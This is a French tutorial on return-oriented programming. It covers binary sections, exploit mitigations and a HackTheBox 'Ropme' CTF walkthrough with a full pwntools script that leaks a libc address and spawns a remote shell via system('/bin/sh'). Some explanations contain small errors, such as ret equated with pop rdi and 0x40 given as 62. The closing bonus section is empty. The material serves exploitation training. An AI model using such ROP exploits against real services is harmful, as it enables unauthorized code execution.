---
title: "Return-oriented programming (ROP)"
description: Article théorique et pratique sur le ROP
---

# Sommaire
1. [Les sections d'un binaire](#Les_sections)
2. [Les protections](#Les_protections)
3. [Qu'est ce que le ROP ?](#ROP)
4. [Exploitation + Walkthrough ROPME - HackTheBox](#ropme)
5. [Bonus - ROP Chain via le gadget int 0x80](#bonus_ropchain)


Avant de commencer à vous expliquer le ROP je vais devoir vous expliquer avant tout quelques notions essentielles à la bonne compréhension de la suite de cette article ! 😀


<div id='Les_sections'/>
# Les sections d'un binaire

Pour le ROP nous allons nous intéréssé particulièrement à ces sections :

### Global Offset Table (GOT)

La GOT (Global Offset Table) est une section qui effectue une résolution d'adresse de la libc pour un gain de temps au processeur. C'est un tableau de pointeurs qui stocke les vrais adresses des fonctions de la libc.

### Procedure Linkage Table (PLT)

La PLT (Procedure Linkage Table) est une section qui contient du code permettant de résoudre les fonctions de la libc exécutées dans le binaire. C'est une table servant à faire le lien avec les fonctions situées dans des bibliothèques dynamiques. Cette section se trouve à des adresses fixes

### Les segments d'un binaire

- Le segment TEXT contient le code du binaire
- Le segment BSS contient les variables non itilialisées, par exemple en C :
```c
char var[256];
```
- Le segment DATA contient les variables initialisées, par exemple en C : 
```c
char var[256] = "nuts";
```

<div id='Les_protections'/>
# Les protections des exécutables

- **NX** est une protection qui rend la pile Non eXécutable. Cette technique empeche l'exécution d'un shellcode dans la stack. Pour bypass cette protection nous devons effectuer un **ret2libc**, BTW voici un exemple d'exploitation : [HackTheBox - Enterprise](https://nuts7.github.io/articles/htb-enterprise/).

- Le **DEP** (Data Execution Prevention) consiste à protéger les zones de mémoires non exécutables. L'activation de la fonctionnalité DEP consiste à passer le bit NX à 1 dans le processeur.

- L’**ASLR** (Address space layout randomization) est une technique permettant de placer de façon aléatoire les adresses de la stack, du tas et des bibliothèques partagées.

- **PIE** permet de placer de facon aléatoire des emplacements mémoires (comme l'ASLR) mais cette fois ci, pour la zone de code et la zone de donnée.

- Le **stack canary** ou la **Stack Smashing Protection** (SSP) est une protection qui est placé entre le buffer et le couple EBP et EIP (32 bits) ou RBP et RIP (64 bits). Si la valeur du canary est réecrite avec la mauvaise valeur alors le programme se ferme. (4 octets en 32 bits, 8 octets en 64 bits) Cependant, en assembleur nos ordinateurs vérifient octets par octets les chaines de caractères, alors nous pouvons brute force byte par byte la valeur du canary afin de la leak et de réecrire la bonne valeur du canary.

- Le **Fortify Source** permet de détecter certaines erreurs de développement causant un buffer overflow dans le code source d'une application lors de l'utilisation de diverses fonctions de manipulation de chaînes de caractères et de mémoire (par exemple, memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets)

- **RELRO** est une protection permettant de demander au linker de résoudre les fonctions de bibliothèques dynamiques au tout début de l’exécution, et donc de pouvoir remapper la section GOT et GOT.plt en lecture seule. 

<div id='ROP'/>
# Qu'est ce que le ROP ?

Le ROP (Return-oriented programming) est une technique d'exploitation reposant sur la recherche de blocs d'instructions à l'intérieur d'un binaire, ces blocs sont appelés **gadget**. Ces morceaux de code terminent généralement par un ret (= pop rdi), un call ou un jmp. Nous allons pouvoir chainer ces gadgets dans la stack afin d'exécuter une suite d'actions, appelé **ROP Chain**.

<p align="center">
  <img width="460" height="300" src="https://media.giphy.com/media/q6RoNkLlFNjaw/giphy.gif">
</p>

Le ROP va permettre de bypass principalement des protections telles que NX, l'ASLR et le DEP.



<div id='ropme'/>
# Exploitation + Walkthrough ROPME - HackTheBox

Passon à la pratique ! Pour un exemple d'exploitation de ROP Chain via un leak d'adresse de la libc, j'ai décidé d'utiliser le challenge [Ropme de HackTheBox](https://www.hackthebox.eu/home/challenges/download/8). (binaire 64 bits)

Avant tout, essayons de désassembler la fonction main du programme et de trouver une fonction vulnérable aux buffer overflow :

```py
❯ gdb -q ropme
gef➤  disassemble main 
Dump of assembler code for function main:
   0x0000000000400626 <+0>:	push   rbp
   0x0000000000400627 <+1>:	mov    rbp,rsp
   0x000000000040062a <+4>:	sub    rsp,0x50
   0x000000000040062e <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x0000000000400631 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000400635 <+15>:	mov    edi,0x4006f8
   0x000000000040063a <+20>:	call   0x4004e0 <puts@plt>
   0x000000000040063f <+25>:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400646 <+32>:	mov    rdi,rax
   0x0000000000400649 <+35>:	call   0x400510 <fflush@plt>
   0x000000000040064e <+40>:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]
   0x0000000000400659 <+51>:	mov    esi,0x1f4
   0x000000000040065e <+56>:	mov    rdi,rax
   0x0000000000400661 <+59>:	call   0x400500 <fgets@plt> # VULN FUNCTION
   0x0000000000400666 <+64>:	mov    eax,0x0
   0x000000000040066b <+69>:	leave  
   0x000000000040066c <+70>:	ret    
End of assembler dump.
gef➤  quit
❯ python2 -c "print 'A' * 200" | ./ropme
ROP me outside, how 'about dah?
[1]    68022 done                              python2 -c "print 'A' * 200" | 
       68023 segmentation fault (core dumped)  ./ropme
```

Ici la fonction fgets ne vérifie pas le nombre d'octets entrée par l'utilisateur du programme. Par conséquent nous avons pu faire segfault le binaire avec une saisie trop importante par rapport à l'espace alloué par le buffer.

Ensuite, comme dans un buffer overflow basique nous devons récupérer l'offset afin d'overwrite nos registres avec une adresse valide à la place de nos "A".
Dans la fonction main on peut observer que le buffer est alloué à cette instruction : `0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]`.<br/>
0x40 est égal à 62 en décimal (`gef➤  p/d 0x40  $1 = 64`), donc 62 octets sont alloués dans la pile, les 8 octets suivants seront la sauvegarde RBP de la précédente stack frame, et les 8 octets suivants seront l'adresse de retour (RIP).

Une **ret2libc** afin d'exécuter un shellcode dans la stack aurait été possible si le bit NX n'était pas activé, cependant ce n'est pas le cas, ainsi que l'ASLR sur le serveur distant :

```py
❯ checksec --file=ropme
[*] '/home/nuts/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```py
from pwn import *

HOST, PORT = '178.62.118.108', 30396 

#p = process('./ropme', stdin=PTY)
p = remote(HOST, PORT)
elf = ELF('./ropme')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

padding = b'A' * 72 # offset to overwrite RBP
gadget = 0x4006d3 # pop rdi ; ret
puts_plt = elf.plt['puts'] # 0x4004e0 (PLT in GEF)
puts_got = elf.got['puts'] # 0x601018 (GOT in GEF)
addr_main = elf.symbols['main'] # 0x400626 (1st Address Prologue Main Function)

p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld

pld = b''
pld += padding # buffer + overwrite RBP (8 octets)
pld += p64(gadget) # 1 argument (pop rdi ; ret)
pld += p64(puts_got) # to save addr puts of GOT in rdi register
pld += p64(puts_plt) # to print puts GOT
pld += p64(addr_main) # ret2main
p.sendline(pld) # send payload

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00')) # to get valid address
log.info('Addr puts (GOT) leak : {}'.format(hex(puts_leak))) # print address puts leaked

libc_puts = 0x06f690
libc_binsh = 0x18cd17
libc_system = 0x045390

libc_base = puts_leak - libc_puts # calculate addr base
log.info('libc base at ' + hex(libc_base))

addr_system = libc_base + libc_system # calculate difference between base and system function

binsh = libc_base + libc_binsh # calculate difference between base and /bin/sh

log.info('System at ' + hex(addr_system))
log.info('/bin/sh at ' + hex(binsh))

p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld

pld = b''
pld += padding # offset to go save EIP 
pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
pld += p64(binsh) # 
pld += p64(addr_system)

p.sendline(pld) # send payload 
p.interactive() # spawn interactive shell

p.close()
```

<p align="center">
  <img width="460" height="300" src="https://media.giphy.com/media/VY20vTr6KCbOBKiGIL/giphy.gif">
</p>

<div id='bonus_ropchain'/>
# Bonus - ROP Chain via le gadget int 0x80
